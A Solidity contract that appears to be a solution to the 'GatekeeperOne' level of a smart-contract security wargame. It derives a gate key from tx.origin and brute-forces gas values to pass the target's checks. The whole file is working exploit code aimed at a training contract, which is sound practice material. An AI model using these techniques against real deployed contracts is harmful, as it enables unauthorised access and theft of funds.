// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IGateKeeperOne{
    function enter(bytes8) external returns (bool);
}
contract LetMeThrough {

    IGateKeeperOne level13 = IGateKeeperOne(0xbDe412a3a419560a1AFF638031685F35e87b0e30);

    function exploit() external{
        bytes8 _gateKey = bytes8(uint64(tx.origin)) & 0xFFFFFFFF0000FFFF;
        for (uint256 i = 0; i < 300; i++) {
            (bool success, ) = address(level13).call{gas: i + (8191 * 3)}(abi.encodeWithSignature("enter(bytes8)", _gateKey));
            if (success) {
                break;
            }
        }
    }
}
